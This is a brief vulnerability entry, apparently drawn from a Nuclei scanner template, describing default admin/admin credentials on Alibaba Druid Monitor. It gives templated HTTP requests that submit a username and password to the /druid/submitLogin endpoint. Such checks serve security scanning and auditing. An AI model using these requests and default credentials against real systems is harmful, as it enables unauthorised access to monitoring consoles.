# Vulnerability: Alibaba Druid Monitor Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`druid-default-login.yaml`)

## Description
Alibaba Druid Monitor default login information (admin/admin) was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /druid/submitLogin HTTP/1.1
Host: {{Hostname}}

POST /druid/submitLogin HTTP/1.1
Host: {{Hostname}}

loginUsername={{username}}&loginPassword={{password}}
```

